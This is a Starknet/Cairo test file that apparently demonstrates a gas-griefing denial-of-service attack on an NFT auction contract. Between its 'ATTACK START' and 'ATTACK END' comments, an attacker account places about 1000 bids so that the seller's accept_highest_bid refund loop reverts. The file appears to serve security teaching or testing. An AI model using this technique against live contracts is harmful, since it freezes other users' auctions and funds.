use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
use openzeppelin_token::erc721::interface::IERC721DispatcherTrait;

use starknet::ContractAddress;
use snforge_std::{declare, ContractClassTrait, DeclareResultTrait,  start_cheat_caller_address, stop_cheat_caller_address};
use dedos::auction::auction::{
    IAuctionDispatcher, IAuctionDispatcherTrait
};
use dedos::utils::helpers;


fn deploy_auction(currency: ContractAddress, nft: ContractAddress) 
-> (ContractAddress, IAuctionDispatcher) 
{
    // Declaring the contract class
    let contract_class = declare("Auction").unwrap().contract_class();
    // Creating the data to send to the constructor, first specifying as a default value
    let mut data_to_constructor = Default::default();
    // Pack the data into the constructor
    Serde::serialize(@currency, ref data_to_constructor);
    Serde::serialize(@nft, ref data_to_constructor);
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
    return (address, IAuctionDispatcher { contract_address: address });
}

#[test]
fn test_auction_attack() {
    // Creating the users
    let alice: ContractAddress = 'alice'.try_into().unwrap();
    let bob: ContractAddress = 'bob'.try_into().unwrap();
    let charlie: ContractAddress = 'charlie'.try_into().unwrap();
    let attacker: ContractAddress = 'attacker'.try_into().unwrap();

    // Deploying the contracts
    let (eth_address, eth_dispatcher) = helpers::deploy_eth();
    let (nft_address, nft_dispatcher) = helpers::deploy_nft();
    let (auction_address, auction_dispatcher) = deploy_auction(eth_address, nft_address);

    // Mint 10 tokens to Alice and Charlie, and attacker
    helpers::mint_erc20(eth_address, alice, 10 * helpers::one_ether());
    helpers::mint_erc20(eth_address, charlie, 10 * helpers::one_ether());
    helpers::mint_erc20(eth_address, attacker, 10 * helpers::one_ether());
    // Mint an NFT to Bob
    helpers::mint_nft(nft_address, bob, 1);

    // Check the balances
    assert_eq!(eth_dispatcher.balance_of(alice), 10 * helpers::one_ether());
    assert_eq!(eth_dispatcher.balance_of(charlie), 10 * helpers::one_ether());
    assert_eq!(eth_dispatcher.balance_of(attacker), 10 * helpers::one_ether());
    assert_eq!(nft_dispatcher.balance_of(bob), 1);

    // Bob lists an NFT for auction
    start_cheat_caller_address(nft_address, bob);
    nft_dispatcher.approve(auction_address, 1);
    stop_cheat_caller_address(nft_address);
    start_cheat_caller_address(auction_address, bob);
    auction_dispatcher.list_item(1);
    stop_cheat_caller_address(auction_address);

    // Alice bids 1 WEI on Bob's listing
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(auction_address, 1);
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(auction_address, alice);
    auction_dispatcher.bid(1, 1);
    stop_cheat_caller_address(auction_address);

    // Charlie bids 2 ETH on Bob's listing
    start_cheat_caller_address(eth_address, charlie);
    eth_dispatcher.approve(auction_address, 2 * helpers::one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(auction_address, charlie);
    auction_dispatcher.bid(1, 2 * helpers::one_ether());
    stop_cheat_caller_address(auction_address);

    // Bob accept the highest bid and closes the auctions
    start_cheat_caller_address(auction_address, bob);
    auction_dispatcher.accept_highest_bid(1);
    stop_cheat_caller_address(auction_address);

    // Charlie lists his new NFT for auction
    start_cheat_caller_address(nft_address, charlie);
    nft_dispatcher.approve(auction_address, 1);
    stop_cheat_caller_address(nft_address);
    start_cheat_caller_address(auction_address, charlie);
    auction_dispatcher.list_item(1);
    stop_cheat_caller_address(auction_address);

    // Alice bids 1 WEI on Charlie's listing
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(auction_address, 1);
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(auction_address, alice);
    auction_dispatcher.bid(1, 1);
    stop_cheat_caller_address(auction_address);

    // ATTACK START //
    // Prevent Charlie from accepting the highest bid and close the auction
    // Create a lot of bids for the same item
    // When Charlie calls the `accept_highest_bid` function, the internal
    // while loop refunding the losing bids will revert due to gas limits
    let mut i: u256 = 2;
    while i < 1000 {
        start_cheat_caller_address(eth_address, attacker);
        eth_dispatcher.approve(auction_address, i);
        stop_cheat_caller_address(eth_address);
        start_cheat_caller_address(auction_address, attacker);
        auction_dispatcher.bid(1, i);
        stop_cheat_caller_address(auction_address);
        i += 1;
    }

    // ATTACK END //

    // Charlie accept the highest bid and closes the auctions
    // This should fail and revert since the attacker broke the contract
    start_cheat_caller_address(auction_address, charlie);
    auction_dispatcher.accept_highest_bid(1);
    stop_cheat_caller_address(auction_address);
}

